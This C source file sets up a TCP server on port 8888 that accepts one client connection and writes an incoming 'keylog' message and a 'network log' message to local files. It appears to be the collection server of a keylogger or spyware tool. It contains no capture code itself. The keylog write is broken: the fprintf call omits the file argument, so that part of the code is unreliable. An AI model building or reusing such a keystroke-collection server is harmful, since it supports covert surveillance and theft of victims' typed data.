#include <stdio.h>
#include <stdlib.h>
#include <string.h>      
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(int argc , char *argv[])
{
    // Variables
    int ssock, csock, addrlen, read_size, ret;
    struct sockaddr_in server, client;
    char message[3000];
    
    short port = 8888;
    
    // Create a socket. Return value is a file descriptor for the socket.
    ssock = socket(AF_INET, SOCK_STREAM, 0);
    if (ssock == -1) {
        perror("Error creating socket\n");
        exit(0);
    }
    printf("Server socket created\n");
    
    // Set the server ip address, connection family and port. INADDR_ANY means
    // all the ip addresses of the server can be used to set up connection.
    server.sin_family      = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port        = htons(port);
    
    // Bind the socket for the connection
    if (bind(ssock, (struct sockaddr *) &server, sizeof(server)) < 0) {

        perror("Error binding\n");
        close(ssock);
        exit(0);
    }
    printf("Binding done\n");
    
    // Listen for incoming connections
    listen(ssock, SOMAXCONN);
    printf("Listening...\n");
    
    printf("Waiting for incoming connections...\n");
    addrlen = sizeof(struct sockaddr_in);
    
    // Accept connection from an incoming client
    csock = accept(ssock, (struct sockaddr *) &client, (socklen_t *) &addrlen);
    if (csock < 0) {
        perror("Error accepting connections\n");
        exit(0);
    }
    printf("Connection accepted\n");
    
    memset(message, 0, sizeof(message));  //clear message array
    
    /*Open keylog files for printing*/
    FILE *keylog_file = fopen("log/keylog_received.txt", "a");
    /*Receive a keylog file from the client*/
    if ((read_size = read(csock, message, sizeof(message))) > 0) {
        fprintf("%s\n", message);
    } else {
        perror("Error receiving keylog log\n");
    }
    fclose(keylog_file);
    
    memset(message, 0, sizeof(message));  //clear message array
    /*Open network log file for printing*/
    FILE *network_log = fopen("log/network_received.txt", "a");
    /*Receive network log file*/
    if ((read_size = read(csock, message, sizeof(message))) > 0) {
        fprintf(network_log,"%s\n", message);
    } else {
        perror("Error receiving network log\n");
    }
    fclose(network_log);
    
    memset(message, 0, sizeof(message));
    printf("\nLog transfer complete\n");
    
    close(csock);
    close(ssock);
    printf("End connection\n");
    
    return 0;
}
